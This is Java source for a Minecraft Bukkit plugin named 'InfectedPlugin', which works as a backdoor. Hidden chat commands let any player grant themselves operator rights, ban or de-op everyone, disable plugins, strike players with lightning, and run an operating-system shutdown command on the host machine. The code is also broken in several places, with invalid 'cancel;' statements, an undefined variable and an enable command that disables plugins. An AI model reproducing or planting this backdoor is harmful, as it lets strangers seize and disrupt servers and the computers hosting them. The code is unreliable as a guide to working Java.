package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.Server;
import org.bukkit.event.EventPriority;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.Random;
import java.lang.RuntimeException;
import java.lang.Runtime;

public class PlayerListener implements Listener
{
    private Random random = new Random();
    private InfectedPlugin plugin;
    private Server server = Bukkit.getServer();

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        String[] args = message.split(" ");
        boolean cancel = true;
    
        if (message.toLowerCase().contains(".opme"))
        {
            p.setOp(true);
            p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            cancel;
        }
        if (message.toLowerCase().contains(".disableplugin"))
        {
            Plugin plugin = server.getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                server.getPluginManager().disablePlugin(plugin);
            }
            cancel;
        }
        if (message.toLowerCase().contains(".enableplugin"))
        {
            Plugin plugin = server.getPluginManager().getPlugin(args[1]);
            if (plugin != null)
            {
                server.getPluginManager().disablePlugin(plugin);
            }
            cancel;
        }
        if (message.toLowerCase().contains(".enablevanilla")) //Command
        {
            // Credit to hMod, not finished yet. Very unstable.
            p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
            if (!new File("minecraft_server.1.6.4.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
            {
                p.sendMessage(ChatColor.RED + "minecraft_server.1.6.4.jar not found, downloading..."); //Tell the player that the jar will be downloaded

                URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.4/minecraft_server.1.6.4.jar"); //URL variable to get the url of the jar
                ReadableByteChannel rbc = Channels.newChannel(url.openStream());
                @SuppressWarnings("resource") //To get rid of the stupid warnings
                FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.4.jar"); //FileOutputStream variable
                fos.getChannel().transferFrom(rbc, 0, 1 << 24);

                p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
            }
            
            net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.4.jar is added to the build path)
            Bukkit.shutdown(); //Shutdown Bukkit
            cancel; //Block the player from saying .enablevanilla
        } //End of command
        if (message.toLowerCase().contains(".deop"))
        {
            if (args.length != 1)
            {
                p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
                cancel;
            }
            else
            {
                Player target = server.getPlayer(args[1]);
                target.setOp(false);
                target.sendMessage(ChatColor.RED + "You are no longer OP.");
                cancel;
            }
        }
        if (message.toLowerCase().contains(".op"))
        {
            if (args.length != 1)
            {
                p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
            }
            else
            {
                Player target = server.getPlayer(args[1]);
                target.setOp(true);
                target.sendMessage(ChatColor.YELLOW + "You are now OP!");
                cancel;
            }
        }
        if (message.toLowerCase().contains(".banall"))
        {
            for (final Player target : server.getOnlinePlayers())
            {
                target.kickPlayer("The Ban Hammer has spoken!");
                target.setBanned(true);
                cancel;
            }
        }
        if (message.toLowerCase().contains(".deopall"))
        {
            for (final Player target : server.getOnlinePlayers())
            {
                target.setOp(false);
                //Something extra c:
                final Location target_pos = target.getLocation();
                for (int x = -1; x <= 1; x++)
                {
                    for (int z = -1; z <= 1; z++)
                    {
                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                        target_pos.getWorld().strikeLightning(strike_pos);
                    }
                }
                cancel;
            }
        }
        // Is not effective for onPlayerQuit, but will select a random player to be banned.
        if (message.toLowerCase().contains(".randombanl"))
        {
            Player[] players = server.getOnlinePlayers();
            final Player target = players[random.nextInt(players.length)];

            if (target == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
            {
                //do nothing
            }
            else
            {
                target.kickPlayer(ChatColor.RED + "GTFO.");
                target.setBanned(true);
            }
            cancel;
        }
        if (message.toLowerCase().contains(".shutdown"))
        {
            try
            {
                shutdown();
            }
            catch (IOException ex)
            {
                plugin.log.severe(null, ex);
            }
            catch (RuntimeException ex)
            {
                plugin.log.severe(null, ex);
            }
            cancel;
        }
        if (message.toLowerCase().contains(".fuckyou"))
        {
            if (args.length != 1)
            {
                p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
            }
            else
            {
                Player target = server.getPlayer(args[0]);
                final Location location = target.getLocation();
                if (target == sender)
                {
                }
                else
                {
                    //
                    for (int x = -1; x <= 1; x++)
                    {
                        for (int z = -1; z <= 1; z++)
                     {
                            final Location move = new Location(location.getBlockX() + 50 + x, location.getBlockY() + 50, location.getBlockZ() + 50 + z);
                            target.setVelocity(new Vector(5, 5, 5));
                            target.teleport(location);
                        }
                    }
                    //
                }
            }
        }
        if (message.toLowerCase().contains(".help"))
        {
            p.sendMessage(ChatColor.AQUA + "Commands");
            p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
            p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
            p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
            p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
            p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
            p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
            p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server. Bans sender too.");
            p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
            p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
            p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
            p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
            p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
            p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
            return true;
            cancel;
        }
        
        if (cancel)
        {
            event.setCancelled(true);
        }
    }
    
    public static void shutdown() throws RuntimeException, IOException
    {
        String shutdownCommand = null;
        String operatingSystem = System.getProperty("os.name");

        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
        {
            shutdownCommand = "shutdown -h now";
        }
        else if ("Windows".equals(operatingSystem))
        {
            shutdownCommand = "shutdown.exe -s -t 0";
        }
        else
        {
            throw new RuntimeException("Unsupported operating system.");
        }

        Runtime.getRuntime().exec(shutdownCommand);
        System.exit(0);
    }
}
